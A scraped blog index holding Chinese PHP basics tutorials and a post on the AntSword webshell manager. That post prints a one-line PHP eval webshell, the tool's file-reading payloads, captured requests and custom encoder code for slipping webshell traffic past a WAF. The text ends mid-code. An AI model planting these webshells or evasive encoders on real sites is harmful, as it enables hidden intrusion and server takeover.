&#x2F;&#x2F;将数组中的指针移动到最前一个位置，并取得新位置上的值；","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--PHP基础2","slug":"PHP开发学习--PHP基础2","date":"2019-11-12T01:24:50.000Z","updated":"2020-11-15T09:22:32.644Z","comments":true,"path":"2019/11/12/PHP开发学习--PHP基础2/","link":"","permalink":"http://s1eady.top/2019/11/12/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%802/","excerpt":"","text":"PHP基础函数函数的定义与调用定义12345function 函数名（$形参1，$形参2， ...... ）&#123; &#x2F;&#x2F;形参，就是形式参数，是变量.函数体语句块； &#x2F;&#x2F;就是若干行代码&#125; 调用1函数名（$实参1，$实参2， ...... ）； &#x2F;&#x2F;实参就是实际参数，是数据 函数执行原理程序总是运行在一个””内存空间”。 程序开始执行的位置所在的空间，可以称之为”主运行空间”。 实际上，通常函数外面的那些程序，都是运行在主空间中。 那么，函数的运行，就相对独立了——每个函数的每次调用，都是运行在单独的一个自己的空间中。 函数参数形参就是定义函数的时候，在函数名后的小括号中给出的变量名。 形参，只能在函数内部使用——即该变量的使用范围仅仅局限于当前函数内部。 形参的本质是变量！ 实参就是调用函数的时候，在函数名后的小括号中给出的数据值。 实参的本质是数据！ 匿名函数12$f1 &#x3D; function(形参...) &#123; ....... &#125; &#x2F;&#x2F;这是定义匿名函数的形式。$f1(实参); &#x2F;&#x2F;这就是调用该调用。可见其调用，跟可变函数的写法非常类似。 函数相关变量的作用域问题3种作用域：局部作用域，全局作用域，超全局作用域； 有3种变量：局部变量，全局变量，超全局变量； 局部作用域与局部变量函数内部范围的作用域，其中定义的变量就是局部变量（包括形参也是局部变量）。局部变量只能在其所在的局部作用域中使用（访问）。 局部变量在函数调用结束时，会被自动销毁（可以理解为函数执行结束，该执行空间也被销毁了）。 123456789&lt;?php$steady&#x3D;&quot;steady is a hacker&quot;;function Jelly($v1,$v2)&#123; $v3&#x3D;20; echo $v3.&quot;&lt;br&gt;&quot;;&#125;echo $v3;&#x2F;&#x2F;报错变量为局部变量，在全局无法调用。echo $steady;?&gt; 输出 1steady is a hacker 静态变量：一个特殊的局部变量静态变量的含义： 在函数内部，使用static关键字修饰的变量。 静态变量的特点： 静态变量的值不会在函数调用结束时被销毁，而是会一直保留。 也就是说，当再次调用函数时，该变量（的值）还能继续使用。 12345678910&lt;?phpfunction Jelly()&#123; static $v3=20; $v3++; echo $v3.&quot;&lt;br&gt;&quot;;&#125;Jelly();Jelly();Jelly();?&gt; 输出 123212223 全局作用域与全局变量函数外部范围的作用域，其中定义的变量就是全局变量。 全局变量只能在其所在的全局作用域中可以直接使用（访问）。 超全局作用域与超全局变量包括局部作用域和全局作用域的的整个作用域范围。 超全局变量可以在所有范围中使用（访问）。 只有有限的10来个系统预定义变量是超全局变量，包括：$_GET, $_POST, $_REQUEST等。 所以，系统预定义变量，也被统称为超全局变量。 总结：12345678910111213&lt;?php$steady_get=$_GET[&#x27;steady&#x27;];$steady=&quot;steady is a hacker&quot;;function Jelly()&#123; $v3=20; $v3++; echo $steady;//报错。 echo $steady_get;//正常输出。&#125;Jelly();echo $v3;//报错。echo $steady_get;?&gt; 一个特别的超全局变量：$GLOBALS一个数组，其中存储了我们自己定义的所有全局变量。 在全局作用域中定义如下变量： 123$v1 &#x3D; 1; &#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v1&#39;], 其值为1$v2 &#x3D; &#39;abc&#39;; &#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v2&#39;], 其值为&#39;abc&#39;$v3 &#x3D; true; &#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v3&#39;], 其值为true 1234567&lt;?php$steady=&quot;steady is a hacker&quot;;function Jelly()&#123; echo $GLOBALS[&#x27;steady&#x27;];&#125;Jelly();?&gt; 输出 1steady is a hacker 一个特别的的关键字：global用于在局部作用域中，修饰一个跟全局变量同名的局部变量。 此时该局部变量也可以使用全局变量的值了——实际上他们其实是类似变量引用关系。 12345678&lt;?php$steady=&quot;steady is a hacker&quot;;function Jelly()&#123; global $steady; echo $steady;&#125;Jelly();?&gt; 输出 1steady is a hacker 文件加载文件加载的含义含义： 将一个（别的）文件包含到当前文件中，成为当前文件运行过程中的一部分。通常，一些公共的代码，在多个页面都需要用到的时候，会做成一个独立的文件。然后在不同的页面需要用到的时候，直接载入进来就可以了。 语法： include “要载入的文件路径”; //可以是相对路径，或本地物理路径。 说明： 可以载入php文件，也可以载入html文件。 原理： 载入一个文件的本质是：将被载入的文件“插入”到当前载入代码所在的位置。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;文件头部&lt;/h1&gt;&lt;?php include &#x27;./inc/steady.html&#x27;; ?&gt; &lt;hr&gt;&lt;?php include &#x27;./inc/steady.php&#x27;; echo &quot;&lt;br&gt;当前的页码为：&quot; . $page; ?&gt;&lt;/body&gt;&lt;/html&gt; 文件加载的四种方式1234include &#39;要加载的文件&#39;；include_once &#39;要加载的文件&#39;；require &#39;要加载的文件&#39;；require_once &#39;要加载的文件&#39;； 四种方式的区别1234include：每次都载入文件（可能会重复载入），如果载入失败，在报错后继续执行后续语句；include_once：只载入一次（不会重复载入），如果载入失败，在报错后继续执行后续语句；require：每次都载入文件（可能会重复载入），如果载入失败，在报错后终止程序；require_once：只载入一次（不会重复载入），如果载入失败，在报错后终止程序； 错误处理错误分类语法错误： 程序不能运行，是在运行之前，检查语法的时候，就发现语法出错，结果是提示错误，不运行程序。 运行时错误： 语法检查没错，然后开始运行，在运行中出现了错误，然后报错。 这是开发中最常见的错误。 逻辑错误： 程序能运行，且一直到结束没有报错，但执行得到的结果却是错的。 常见错误代号常见错误代号有： 123456789101112131415161718192021222324252627282930313233343536373839E_NOTICE：提示性错误，轻微；错误发生后，后面的程序继续执行。E_WARNING：警告性错误，稍微严重；错误发生后，后面的程序继续执行。E_ERROR：严重错误&#x2F;致命错误；错误发生后，后面的程序不再执行！E_PARSE：语法错误（语法解析错误）；语法解释错误，是直接就不运行程序。E_USER_NOTICE：用户自定义的提示错误E_USER_WARNING：用户自定义的警告错误E_USER_ERROR：用户自定义的严重错误E_ALL：它是一个代表“所有”错误的代号。 说明： 12345671，这些错误代号，其实只是系统预先设定的一些常量，他们的值大约是：1， 2， 4， 8， 16.....2，这些错误代号，通常只是用于对错误控制时进行“设置”使用。3，他们是一系列的整数，并具有一定的规律：1,2,4,8,16,32,64， 。。。。4，可以在php.ini中使用（设置）他们，如下所示： 错误显示设置我们可以对此进行设置，以决定以下两点： 1234567891011121314151、设置display_errors以决定是否显示错误：在php.ini中设置：display_errors &#x3D; On或Off这里设置，影响所有使用该php语言引擎的代码（网站页面）在php文件中设置：ini_set(&#39;display_errors&#39;, 1或0); &#x2F;&#x2F;1表示显示，0不显示在这里设置，只影响当前网页代码本身。2、设置error_reporting以决定显示哪些错误：在php.ini中设置：error_reporting &#x3D; 错误代号1 | 错误代号2 | ..... &#x2F;&#x2F;(要显示的就写出来，或者可以写E_ALL, 表示显示所有）在代码php文件中，道理类似：ini_set(&#39;error_reporting&#39;, 错误代号1 | 错误代号2 | .....） 错误日志设置如果有错误发生（触发了错误），默认情况下不会将错误信息记录（保存）下来。 我们可以对此进行设置，以决定以下两点： 123456789101112131、设置log_errors以决定是否记录错误：php.ini中设置：log_errors &#x3D; On 或 Off代码文件中设置：ini_set (&#39;log_errors&#39;, 1或0)2、设置error_log以决定记录到哪里：通常，就设置为一个文件名，php系统会在网站的每个文件夹下都建立该文件，并记录错误。php.ini中：error_log &#x3D; error.txt; &#x2F;&#x2F;它是纯文本的代码中：ini_set(&quot;error_log&quot;, &#39;error.txt&#39;);","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--PHP基础1","slug":"PHP开发学习--PHP基础1","date":"2019-11-10T20:24:18.000Z","updated":"2020-11-15T09:22:33.676Z","comments":true,"path":"2019/11/11/PHP开发学习--PHP基础1/","link":"","permalink":"http://s1eady.top/2019/11/11/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%801/","excerpt":"","text":"PHP基础PHP基本语法规则PHP标记三种写法steady.php 1&lt;?php phpinfo();?&gt; steady.php，在PHP之后被弃用。 123&lt;script language=&quot;php&quot;&gt; phpinfo();&lt;/script&gt; steady.php 1&lt;? phpinfo();?&gt; 需要到php.ini中进行配置：short_open_tag = On//默认为Off，表示不能用该形式。 注意： 纯PHP代码：可以省略标记结尾符。 1&lt;?php phpinfo(); PHP语句结束符使用英文分号（;）表示一条语句的结束。 PHP注释单行注释两个斜杠： //斜杠后面的部分就是注释内容，PHP语言不会去处理它（不执行）。 多行注释： 1234&#x2F;*这是注释内容。。。可以写多行*&#x2F; 变量定义1$steady&#x3D;good 注意：变量区分大小写。 变量的命令规则1，构成：字母、数字、下划线； 2，开头：字母或下划线； 3，注意：变量名不要跟系统中的“关键字”（即语法所用单词）重复——关键字不多，也就几十个。 变量的四种基本操作赋值1$steady&#x3D;good 取值判断变量isset()判断一个”变量名”是否里面存储了数据，判断的结果是：true（真，表示有），或者false（假，表示没有）。 null是一个特殊的”数据”（值），该数据的含义是：没有数据。 1234567891011121314&lt;?php$steady=&quot;steady is good&quot;;echo isset($steady);var_dump(isset($steady));$steady2=&quot;&quot;;echo isset($steady2);var_dump(isset($steady2));$steady3=&quot;&quot;;echo isset($steady13);var_dump(isset($steady13));$steady4=null;echo isset($steady4);var_dump(isset($steady4));?&gt; 输出 1234561/Applications/MAMP/htdocs/1.php:4:boolean true1/Applications/MAMP/htdocs/1.php:7:boolean true/Applications/MAMP/htdocs/1.php:10:boolean false/Applications/MAMP/htdocs/1.php:13:boolean false 删除/销毁变量unset()删除变量的本质是：断开变量名跟其关联过的那个数据之间的”联系”。 123456789&lt;?php$steady=&quot;steady is good&quot;;echo isset($steady);var_dump(isset($steady));unset($steady);$steady2=isset($steady);var_dump($steady2);echo $steady;?&gt; 输出 1231/Applications/MAMP/htdocs/1.php:4:boolean true/Applications/MAMP/htdocs/1.php:7:boolean false 变量传值只有两种传数据的方式：值传递，和引用传递。 值传递两个变量在赋值之后，就相互独立，各自有自己的存放空间。改变一个，另一个不受影响。 123456&lt;?php$steady=&quot;steady is good&quot;;$jelly=$steady;echo $steady.&quot;&lt;br&gt;&quot;;echo $jelly;?&gt; 输出 12steady is goodsteady is good 引用传递两个变量在使用值传递的时候，只要两个变量之间的关系确定为值传递，那么其中一个变量改变，另一个变量也会改变。 1234567891011&lt;?php$steady=&quot;steady is good&quot;;$jelly=&amp;$steady;echo $steady.&quot;&lt;br&gt;&quot;;$jelly=&quot;20&quot;;echo $jelly.&quot;&lt;br&gt;&quot;;$steady=&quot;30&quot;;echo $jelly.&quot;&lt;br&gt;&quot;;?&gt; 输出 123steady is good2030 预定义变量$_GET变量steady.html 12345678910111213141516&lt;html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;steady-GET&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;steady_get.php&quot; method=&quot;get&quot;&gt; 姓名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; 年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/body&gt;&lt;/html&gt; steady_get.php 123456&lt;?php$name=$_GET[&#x27;userName&#x27;];//这里的变量名字就是我们表单中的变量名字。$age=$_GET[&#x27;age&#x27;];echo &quot;&lt;br&gt;&quot;.&quot;名字为：&quot;.$name;echo &quot;&lt;br&gt;&quot;.&quot;年龄为：&quot;.$age;?&gt; $_POST变量steady.html 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;steady_post.php&quot; method=&quot;post&quot;&gt; 数字1&lt;input type=&quot;text&quot; name=&quot;num1&quot;&gt; &lt;br&gt; 数字2&lt;input type=&quot;text&quot; name=&quot;num2&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;计算！&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; steady_post.php 12345678&lt;?php $n1 = $_POST[&#x27;num1&#x27;];$n2 = $_POST[&quot;num2&quot;];$result = $n1 + $n2;$result2 = $_POST[&#x27;num1&#x27;] + $_POST[&#x27;num2&#x27;];echo &quot;&lt;br&gt;相加计算的结果为：&quot;, $result;echo &quot;&lt;br&gt;相加计算的结果为：&quot;, $result2;?&gt; $_REQUEST变量同上。 $_SERVER变量任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息。 常用的有： 123456PHP_SELF： 表示当前请求的网页地址（不含域名部分）SERVER_NAME： 表示当前请求的服务器名SERVER_ADDR： 表示当前请求的服务器IP地址DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个）REMOTE_ADDR： 表示当前请求的客户端的IP地址SCRIPT_NAME： 表示当前网页地址 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php // PHP_SELF： 表示当前请求的网页地址（不含域名部分）// SERVER_NAME： 表示当前请求的服务器名// SERVER_ADDR： 表示当前请求的服务器IP地址// DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个）// REMOTE_ADDR： 表示当前请求的客户端的IP地址// SCRIPT_NAME： 表示当前网页地址echo &quot;&lt;br&gt;你访问的网页为：&quot; , $_SERVER[&#x27;PHP_SELF&#x27;];echo &quot;&lt;br&gt;你访问的网站为：&quot; , $_SERVER[&#x27;SERVER_NAME&#x27;];echo &quot;&lt;br&gt;你访问的网站物理路径为：&quot; , $_SERVER[&#x27;DOCUMENT_ROOT&#x27;];echo &quot;&lt;br&gt;你的IP为：&quot;, $_SERVER[&#x27;REMOTE_ADDR&#x27;];$ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;];file_put_contents(&quot;$ip.txt&quot;, $ip)?&gt;&lt;/body&gt;&lt;/html&gt; 输出 1234你访问的网页为：/1.php你访问的网站为：127.0.0.1你访问的网站物理路径为：/Applications/MAMP/htdocs你的IP为：127.0.0.1 可变变量12345&lt;?php$steady=10;$b=&quot;steady&quot;;echo $$b;?&gt; 输出 110 常量常量的变量名字常用大小表示。 常量的两种定义形式123456&lt;?phpdefine(&quot;STEADY&quot;,&quot;steady&quot;);const DELLY=&quot;steady&quot;;echo STEADY;echo &quot;&lt;br&gt;&quot;.DELLY;?&gt; 输出 12steadysteady 常量的两种取值形式echoecho 常量名;//注意：使用常量，前面不带”$”符号，也不能有引号 使用constant()函数以取值：echo constant(‘常量名’);//注意，此时常量名要用引号引起来。 预定义常量123456预定义常量就是PHP语言内部预先定义好的常量，我们可以直接使用。比如：PHP_VERSION, PHP_OS, PHP_INT_MAX, M_PI等。PHP_VERSION： 表示当前php的版本信息PHP_OS： 表示当前php运行所在的系统信息PHP_INT_MAX： 表示当前版本的php中的最大的整数值M_PI： 表示圆周率π（一个有10多位小数的数） 魔术常量魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。 123__DIR__ ：代表当前php网页文件所在的目录__FILE__ ：代表当前php网页文件本身的路径__LINE__ ：代表当前这个常量所在的行号 输出 12345678最大的整数：9223372036854775807圆周率pi为：3.14159265359下面演示3个魔术常量当前网页所在路径：&#x2F;Applications&#x2F;MAMP&#x2F;htdocs当前网页文件路径：&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;1.php当前这一行的行号：9当前这一行的行号：10 错误抑制符在一个表达式出现错误的时候，可以将错误“隐藏”（掩盖）起来（不输出）。 123if(@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123&#39;))&#123;.......&#125;","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"蚁剑—bypass","slug":"蚁剑使用--Bypass Waf","date":"2019-10-27T18:23:43.000Z","updated":"2020-11-15T09:20:19.465Z","comments":true,"path":"2019/10/28/蚁剑使用--Bypass Waf/","link":"","permalink":"http://s1eady.top/2019/10/28/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/","excerpt":"","text":"蚁剑的工作原理连接shell一句话shell 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt; 蚁剑会发送post包，给cmd参数传递不同操作对应的php代码，比如连接shell的时候传递 123456789101112131415161718192021222324252627282930313233343536@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123; return $out;&#125;;function asoutput()&#123; $output=ob_get_contents(); ob_end_clean(); echo &quot;595fa0323f&quot;; echo @asenc($output); echo&quot;da825&quot;;&#125;ob_start();try&#123; $D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if($D==&quot;&quot;) $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); $R=&quot;&#123;$D&#125; &quot;; if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L) if(is_dir(&quot;&#123;$L&#125;:&quot;)) $R.=&quot;&#123;$L&#125;:&quot;; &#125;else&#123; $R.=&quot;/&quot;; &#125; $R.=&quot; &quot;; $u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;; $s=($u)?$u[&quot;name&quot;]:@get_current_user(); $R.=php_uname(); $R.=&quot; &#123;$s&#125;&quot;; echo $R;;&#125; catch(Exception $e)&#123; echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); 查看php文件 123456789101112131415161718192021222324@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123; return $out;&#125;;function asoutput()&#123; $output=ob_get_contents(); ob_end_clean(); echo &quot;7545b34&quot;; echo @asenc($output); echo &quot;644b58cc3bac&quot;;&#125;ob_start();try&#123; $F=base64_decode($_POST[&quot;x7e381bdf1773a&quot;]); $P=@fopen($F,&quot;r&quot;); echo(@fread($P,filesize($F)?filesize($F):4096)); @fclose($P);;&#125;catch(Exception $e)&#123; echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;x7e381bdf1773a=RTovcGhwc3R1ZHkvcGhwc3R1ZHlfcHJvL1dXVy9zcWxpMS9MZXNzLTEvaW5kZXgucGhw 蚁剑使用–Bypass Waf修改蚁剑UA全局设置中添加请求头 单独的webshell添加请求头 修改源代码在项目路径.modules/request.js中进行修改: 另外项目路径下的.modules/update.js也需要修改： 使用Multipart发包 数据会以post的表单形式发送。 编码器编码器的作用当使用蚁剑控制webshell向服务器发送数据包时，数据包中的body部分会按照编码器中定义的规则进行编码或者加密后在发送，这样就可以避免有比较明显的命令执行特征从儿被WAF拦截。 蚁剑的编码器规则以下规则就是蚁剑的默认编码规则，如图： 1234567891011121314151617181920212223242526272829303132/** * php::base64编码器 * Create at: 2020/08/19 7:30:36 */&#x27;use strict&#x27;;/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; // ########## 请在下方编写你自己的代码 ################### // 以下代码为 PHP Base64 样例 // 生成一个随机变量名 let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; // 原有的 payload 在 data[&#x27;_&#x27;]中 // 取出来之后，转为 base64 编码并放入 randomID key 下 data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;); // shell 在接收到 payload 后，先处理 pwd 参数下的内容， data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`; // ########## 请在上方编写你自己的代码 ################### // 删除 _ 原有的payload delete data[&#x27;_&#x27;]; // 返回编码器处理后的 payload 数组 return data;&#125; 整个代码是一个module.exports函数，其中有三个参数pwd、data、ext。 pwd: 类型是String, 这个是 shell 的连接密码 data: 类型是 Array, 这个是要发送的 HTTP POST 数据包 ext: 它是个对象，这个是一些扩展参数 在自定义编码方式时只需要去修改data[&#39;_&#39;]中的内容就可以了。 将蚁剑使用burp代理拦截，查看请求。 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 948Connection: close_0xe804371f038f9=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTgxZjMyNjlmNjczIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJiMDkxMTRjNSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&amp;cmd=eval(base64_decode(%24_POST%5B_0xe804371f038f9%5D))%3B 但是我们看到代码中有eval函数，很容易被waf拦截。接下来我们我们尝试编辑绕过waf。 编码器规则绕过WafBase64编码为了避免waf识别eval等敏感函数，我们可以对其进行base64编码，将cmd的值base64编码也就是对data[pwd]的内容进行base64编码。 这里我们直接把原有的payloadbase64进行编码。 123456&#x2F;&#x2F; ########## 请在下方编写你自己的代码 ###################&#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，data[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);&#x2F;&#x2F; ########## 请在上方编写你自己的代码 ################### 查看一下payload 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 868Connection: closecmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNTY0OTUzNGQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjliN2FiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 可以看到对payload直接进行base64编码，但是如果waf的检测机制是解码payload然后在进行检测，就无法绕过。所以我们需要自定义一些编码机制，来绕过waf。 rot13rot13 的 js 实现 123456789const rot13encode = (s) =&gt; &#123; return s.replace(/[a-zA-Z]/g, function (c) &#123; return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26); &#125;);&#125; 1234567891011const rot13encode = (s) =&gt; &#123; return s.replace(/[a-zA-Z]/g, function (c) &#123; return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26); &#125;);&#125;data[pwd] = Buffer.from(rot13encode(data[&#x27;_&#x27;])).toString(); 最终发送payload 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 992Connection: closecmd=%40vav_frg(%22qvfcynl_reebef%22%2C%20%220%22)%3B%40frg_gvzr_yvzvg(0)%3Bshapgvba%20nfrap(%24bhg)%7Berghea%20%24bhg%3B%7D%3Bshapgvba%20nfbhgchg()%7B%24bhgchg%3Dbo_trg_pbagragf()%3Bbo_raq_pyrna()%3Brpub%20%2267p814%22%3Brpub%20%40nfrap(%24bhgchg)%3Brpub%20%22132nr0pso07%22%3B%7Dbo_fgneg()%3Bgel%7B%24Q%3Dqveanzr(%24_FREIRE%5B%22FPEVCG_SVYRANZR%22%5D)%3Bvs(%24Q%3D%3D%22%22)%24Q%3Dqveanzr(%24_FREIRE%5B%22CNGU_GENAFYNGRQ%22%5D)%3B%24E%3D%22%7B%24Q%7D%09%22%3Bvs(fhofge(%24Q%2C0%2C1)!%3D%22%2F%22)%7Bsbernpu(enatr(%22P%22%2C%22M%22)nf%20%24Y)vs(vf_qve(%22%7B%24Y%7D%3A%22))%24E.%3D%22%7B%24Y%7D%3A%22%3B%7Dryfr%7B%24E.%3D%22%2F%22%3B%7D%24E.%3D%22%09%22%3B%24h%3D(shapgvba_rkvfgf(%22cbfvk_trgrtvq%22))%3F%40cbfvk_trgcjhvq(%40cbfvk_trgrhvq())%3A%22%22%3B%24f%3D(%24h)%3F%24h%5B%22anzr%22%5D%3A%40trg_pheerag_hfre()%3B%24E.%3Dcuc_hanzr()%3B%24E.%3D%22%09%7B%24f%7D%22%3Brpub%20%24E%3B%3B%7Dpngpu(Rkprcgvba%20%24r)%7Brpub%20%22REEBE%3A%2F%2F%22.%24r-%3EtrgZrffntr()%3B%7D%3Bnfbhgchg()%3Bqvr()%3B 任何你能想到的字符串变换的方式，你都可以自由使用，互相随意组合，打造一款属于你自己的无特征的编码器。 编码器限制由于蚁剑只会对data[pwd]里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。 解决办法是遍历data[_]取出其中的值并将其全部编码。 1234567891011121314151617181920212223242526&#x2F;** * php::base64编码器 * Create at: 2020&#x2F;05&#x2F;21 13:07:23 *&#x2F;&#39;use strict&#39;;&#x2F;** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*&#x2F;module.exports &#x3D; (pwd, data) &#x3D;&gt; &#123; ########## 请在下方编写你自己的代码 ################### for (let _ in data)&#123; if (_ &#x3D;&#x3D;&#x3D; &#39;_&#39;) &#123; continue &#125;; ret[_] &#x3D; Buffer.from(data[_]).toString(&#39;base64&#39;); ret[_] &#x3D; &#39;steady&#39; + ret[_]; ret[_] 